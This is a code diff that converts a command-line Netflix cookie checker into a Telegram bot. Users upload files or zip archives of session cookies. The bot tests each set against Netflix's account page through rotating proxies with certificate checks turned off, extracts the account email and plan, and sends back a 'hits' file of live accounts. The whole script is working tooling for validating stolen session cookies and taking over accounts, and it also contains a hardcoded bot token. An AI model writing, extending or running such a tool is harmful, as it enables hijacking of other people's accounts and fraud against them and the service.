@@ -2,145 +2,135 @@ import os
 import json
 import re
 import sys
+import random
+import time
+import threading
 import requests
 import urllib3
-import threading
+import zipfile
+import io
 from datetime import datetime
-import urllib.parse
-from queue import Queue
+from telegram import Update
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
 # Disable insecure request warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+# --- CONFIGURATION ---
+BOT_TOKEN = "8715756346:AAEGOxnFtsgGSdvaM3frCFqxPjLf-he2HhY"
 UA_WEB = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
 
-class CookieChecker:
-    def __init__(self, proxy=None, output_file="hits.txt"):
-        self.proxy = proxy
-        self.output_file = output_file
-        self.hits_count = 0
-        self.lock = threading.Lock()
-
-    def _get_proxies(self):
-        if not self.proxy:
+class NetflixChecker:
+    def __init__(self, proxy_list=None):
+        self.proxies = proxy_list if proxy_list else []
+        
+    def _get_proxy(self):
+        if not self.proxies:
             return None
-        return {"http": self.proxy, "https": self.proxy}
+        proxy = random.choice(self.proxies)
+        if not proxy.startswith(('http://', 'https://')):
+            proxy = "http://" + proxy
+        return {"http": proxy, "https": proxy}
 
     def parse_cookies(self, text):
-        """Detects and parses JSON or Netscape format into a dict."""
         cookies = {}
         text = text.strip()
-        
-        # Try JSON
         try:
             data = json.loads(text)
             if isinstance(data, list):
                 return {c["name"]: c["value"] for c in data if "name" in c and "value" in c}
-        except:
-            pass
-
-        # Try Netscape
+        except: pass
         for line in text.splitlines():
             line = line.strip()
-            if not line or line.startswith("#"):
-                continue
+            if not line or line.startswith("#"): continue
             parts = line.split("\t")
-            if len(parts) >= 7:
-                cookies[parts[5]] = parts[6]
-        
-        # Try simple key=value if others fail
+            if len(parts) >= 7: cookies[parts[5]] = parts[6]
         if not cookies:
             for part in re.split(r"[;\n]", text):
                 if "=" in part:
                     k, _, v = part.partition("=")
                     if k.strip(): cookies[k.strip()] = v.strip()
-        
         return cookies
 
-    def check_netflix(self, cookies):
-        """Checks if a Netflix account is active using the provided cookies."""
+    def check_account(self, cookies):
         if not any(cookies.get(k) for k in ["NetflixId", "SecureNetflixId"]):
             return None
-
         sess = requests.Session()
         sess.headers.update({"User-Agent": UA_WEB})
-        proxies = self._get_proxies()
-        
+        proxy = self._get_proxy()
         for k, v in cookies.items():
             sess.cookies.set(k, str(v), domain=".netflix.com", path="/")
-
         try:
-            # Check account page
-            r = sess.get("https://www.netflix.com/account", 
-                         proxies=proxies, 
-                         timeout=15, 
-                         verify=False, 
-                         allow_redirects=True)
-            
-            if "login" in r.url.lower() or r.status_code != 200:
-                return None
-            
+            r = sess.get("https://www.netflix.com/account", proxies=proxy, timeout=15, verify=False)
+            if "login" in r.url.lower() or r.status_code != 200: return None
             if '"membershipStatus":"CURRENT_MEMBER"' in r.text:
-                # Extract basic info
                 email = re.search(r'"emailAddress":"([^"]+)"', r.text)
                 email = email.group(1) if email else "Unknown"
                 plan = re.search(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', r.text)
                 plan = plan.group(1) if plan else "Unknown"
-                
-                return {"email": email, "plan": plan, "status": "HIT"}
-        except Exception as e:
-            # print(f"Error checking: {e}")
-            pass
+                return {"email": email, "plan": plan}
+        except: pass
         return None
 
-    def save_hit(self, info, cookie_text):
-        with self.lock:
-            self.hits_count += 1
-            with open(self.output_file, "a") as f:
-                f.write(f"--- HIT #{self.hits_count} ---\n")
-                f.write(f"Email: {info['email']}\n")
-                f.write(f"Plan: {info['plan']}\n")
-                f.write(f"Cookies:\n{cookie_text}\n")
-                f.write("-" * 30 + "\n\n")
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "🚀 **Netflix Cookie Checker Bot**\n\n"
+        "Send me a `.txt`, `.json`, or `.zip` file containing cookies.\n"
+        "I will check them using proxies and send you a `hits.txt` file with the working accounts.",
+        parse_mode="Markdown"
+    )
 
-def process_file(file_path, checker):
-    try:
-        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-            content = f.read()
-            # If the file contains multiple cookies separated by something, we'd split here.
-            # For now, we treat one file as one session/set of cookies.
-            cookies = checker.parse_cookies(content)
-            if cookies:
-                result = checker.check_netflix(cookies)
-                if result:
-                    checker.save_hit(result, content)
-                    return True
-    except Exception as e:
-        print(f"Error processing {file_path}: {e}")
-    return False
+async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    doc = update.message.document
+    file = await doc.get_file()
+    file_bytes = await file.download_as_bytearray()
+    
+    status_msg = await update.message.reply_text("⏳ Processing your file... please wait.")
+    
+    # Load proxies if Proxy.txt exists
+    proxies = []
+    if os.path.exists("Proxy.txt"):
+        with open("Proxy.txt", "r") as f:
+            proxies = [line.strip() for line in f if line.strip()]
+    
+    checker = NetflixChecker(proxies)
+    hits = []
+    
+    # Handle ZIP or single file
+    files_to_check = {}
+    if doc.file_name.endswith(".zip"):
+        with zipfile.ZipFile(io.BytesIO(file_bytes)) as z:
+            for name in z.namelist():
+                if name.endswith((".txt", ".json")):
+                    files_to_check[name] = z.read(name).decode("utf-8", errors="ignore")
+    else:
+        files_to_check[doc.file_name] = file_bytes.decode("utf-8", errors="ignore")
+
+    for name, content in files_to_check.items():
+        cookies = checker.parse_cookies(content)
+        if cookies:
+            res = checker.check_account(cookies)
+            if res:
+                hits.append(f"Email: {res['email']}\nPlan: {res['plan']}\nCookies:\n{content}\n{'-'*30}\n")
+
+    if hits:
+        output_file = f"hits_{datetime.now().strftime('%H%M%S')}.txt"
+        with open(output_file, "w", encoding="utf-8") as f:
+            f.writelines(hits)
+        
+        await update.message.reply_document(document=open(output_file, "rb"), filename="hits.txt", caption=f"✅ Done! Found {len(hits)} working accounts.")
+        os.remove(output_file)
+    else:
+        await update.message.reply_text("❌ No working cookies found in the provided file.")
+    
+    await status_msg.delete()
+
+def main():
+    print("[*] Bot is starting...")
+    app = Application.builder().token(BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+    app.run_polling()
 
 if __name__ == "__main__":
-    import argparse
-    parser = argparse.ArgumentParser(description="Cookie Checker Pro")
-    parser.add_argument("input", help="Path to cookie file or folder")
-    parser.add_argument("--proxy", help="Proxy URL (e.g., http://user:pass@ip:port)", default=None)
-    parser.add_argument("--output", help="Output file for hits", default="hits.txt")
-    
-    args = parser.parse_args()
-    
-    checker = CookieChecker(proxy=args.proxy, output_file=args.output)
-    
-    print(f"[*] Starting check on: {args.input}")
-    if args.proxy:
-        print(f"[*] Using proxy: {args.proxy}")
-    
-    if os.path.isfile(args.input):
-        process_file(args.input, checker)
-    elif os.path.isdir(args.input):
-        for root, _, files in os.walk(args.input):
-            for file in files:
-                process_file(os.path.join(root, file), checker)
-    
-    print(f"[*] Finished. Total hits found: {checker.hits_count}")
-    if checker.hits_count > 0:
-        print(f"[*] Hits saved to: {args.output}")
+    main()
